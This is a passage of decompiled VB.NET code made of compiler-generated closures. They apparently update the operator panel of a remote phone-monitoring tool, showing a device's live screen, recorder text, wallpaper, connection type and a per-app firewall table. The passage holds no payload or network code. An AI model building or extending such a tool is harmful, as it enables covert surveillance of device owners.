		// Token: 0x020000C6 RID: 198
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D3
		{
			// Token: 0x060009D4 RID: 2516 RVA: 0x000058EA File Offset: 0x00003AEA
			public _Closure_0024__39_002D3(Data._Closure_0024__39_002D3 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_bmp = arg0._0024VB_0024Local_bmp;
				}
			}

			// Token: 0x060009D5 RID: 2517 RVA: 0x00005901 File Offset: 0x00003B01
			internal void _Lambda_0024__4()
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.Livepicbox.Image = this._0024VB_0024Local_bmp;
			}

			// Token: 0x060009D6 RID: 2518 RVA: 0x00005901 File Offset: 0x00003B01
			internal void _Lambda_0024__5()
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.Livepicbox.Image = this._0024VB_0024Local_bmp;
			}

			// Token: 0x04000E1C RID: 3612
			public Bitmap _0024VB_0024Local_bmp;

			// Token: 0x04000E1D RID: 3613
			public Data._Closure_0024__39_002D2 _0024VB_0024NonLocal__0024VB_0024Closure_3;
		}

		// Token: 0x020000C7 RID: 199
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D4
		{
			// Token: 0x060009D7 RID: 2519 RVA: 0x0000591E File Offset: 0x00003B1E
			public _Closure_0024__39_002D4(Data._Closure_0024__39_002D4 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_ScRecorder = arg0._0024VB_0024Local_ScRecorder;
				}
			}

			// Token: 0x04000E1E RID: 3614
			public ScreenReaderV2 _0024VB_0024Local_ScRecorder;
		}

		// Token: 0x020000C8 RID: 200
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D5
		{
			// Token: 0x060009D8 RID: 2520 RVA: 0x00005935 File Offset: 0x00003B35
			public _Closure_0024__39_002D5(Data._Closure_0024__39_002D5 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_theData = arg0._0024VB_0024Local_theData;
				}
			}

			// Token: 0x060009D9 RID: 2521 RVA: 0x0000594C File Offset: 0x00003B4C
			internal void _Lambda_0024__6()
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_ScRecorder.activetext.Text = this._0024VB_0024Local_theData[3];
			}

			// Token: 0x04000E1F RID: 3615
			public string[] _0024VB_0024Local_theData;

			// Token: 0x04000E20 RID: 3616
			public Data._Closure_0024__39_002D4 _0024VB_0024NonLocal__0024VB_0024Closure_4;
		}

		// Token: 0x020000C9 RID: 201
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D6
		{
			// Token: 0x060009DA RID: 2522 RVA: 0x0000596B File Offset: 0x00003B6B
			public _Closure_0024__39_002D6(Data._Closure_0024__39_002D6 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_bmp = arg0._0024VB_0024Local_bmp;
				}
			}

			// Token: 0x060009DB RID: 2523 RVA: 0x00005982 File Offset: 0x00003B82
			internal void _Lambda_0024__7()
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_5._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_ScRecorder.viewpic.Image = this._0024VB_0024Local_bmp;
			}

			// Token: 0x04000E21 RID: 3617
			public Bitmap _0024VB_0024Local_bmp;

			// Token: 0x04000E22 RID: 3618
			public Data._Closure_0024__39_002D5 _0024VB_0024NonLocal__0024VB_0024Closure_5;
		}

		// Token: 0x020000CA RID: 202
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D7
		{
			// Token: 0x060009DC RID: 2524 RVA: 0x000059A4 File Offset: 0x00003BA4
			public _Closure_0024__39_002D7(Data._Closure_0024__39_002D7 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_SPL = arg0._0024VB_0024Local_SPL;
				}
			}

			// Token: 0x060009DD RID: 2525 RVA: 0x000059BB File Offset: 0x00003BBB
			internal void _Lambda_0024__8()
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wallpaper = reso.Wallpaper(this._0024VB_0024Local_SPL[1], 48, 48, this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient);
			}

			// Token: 0x060009DE RID: 2526 RVA: 0x000F5C9C File Offset: 0x000F3E9C
			internal void _Lambda_0024__9()
			{
				try
				{
					if (this._0024VB_0024Local_SPL[4] != "-1")
					{
						string text = this._0024VB_0024Local_SPL[4];
						if (Operators.CompareString(text, "1", false) != 0)
						{
							if (Operators.CompareString(text, "0", false) != 0)
							{
								this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
							}
							else
							{
								this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources._3g;
							}
						}
						else
						{
							this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
						}
					}
					else
					{
						this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
					}
				}
				catch (Exception ex)
				{
				}
				try
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
				}
				catch (Exception ex2)
				{
				}
			}

			// Token: 0x04000E23 RID: 3619
			public string[] _0024VB_0024Local_SPL;

			// Token: 0x04000E24 RID: 3620
			public Data._Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_6;
		}

		// Token: 0x020000CB RID: 203
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D8
		{
			// Token: 0x060009DF RID: 2527 RVA: 0x000059E9 File Offset: 0x00003BE9
			public _Closure_0024__39_002D8(Data._Closure_0024__39_002D8 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_appinfo = arg0._0024VB_0024Local_appinfo;
				}
			}

			// Token: 0x060009E0 RID: 2528 RVA: 0x000F5D90 File Offset: 0x000F3F90
			internal void _Lambda_0024__11()
			{
				if (Operators.CompareString(this._0024VB_0024Local_appinfo[0], "B", false) != 0)
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_ClassClient.FirewallTable.Rows.Add(new object[]
					{
						Codes.Base64ToImage(this._0024VB_0024Local_appinfo[3]),
						this._0024VB_0024Local_appinfo[2],
						"Allowed",
						this._0024VB_0024Local_appinfo[1]
					});
					return;
				}
				this._0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_ClassClient.FirewallTable.Rows.Add(new object[]
				{
					Codes.Base64ToImage(this._0024VB_0024Local_appinfo[3]),
					this._0024VB_0024Local_appinfo[2],
					"Blocked",
					this._0024VB_0024Local_appinfo[1]
				});
			}

			// Token: 0x04000E25 RID: 3621
			public string[] _0024VB_0024Local_appinfo;

			// Token: 0x04000E26 RID: 3622
			public Data._Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_7;
		}

		// Token: 0x020000CC RID: 204
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D9
		{
			// Token: 0x060009E1 RID: 2529 RVA: 0x00005A00 File Offset: 0x00003C00
			public _Closure_0024__39_002D9(Data._Closure_0024__39_002D9 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_arrystr = arg0._0024VB_0024Local_arrystr;
				}
			}

			// Token: 0x060009E2 RID: 2530 RVA: 0x00005A17 File Offset: 0x00003C17
			internal void _Lambda_0024__12()
			{
				EagleAlert.ShowSucess(this._0024VB_0024Local_arrystr[1] + " has been: " + this._0024VB_0024Local_arrystr[2]);
			}

			// Token: 0x04000E27 RID: 3623
			public string[] _0024VB_0024Local_arrystr;

			// Token: 0x04000E28 RID: 3624
			public VB_0024AnonymousDelegate_0 _0024I12;
		}
	}
}
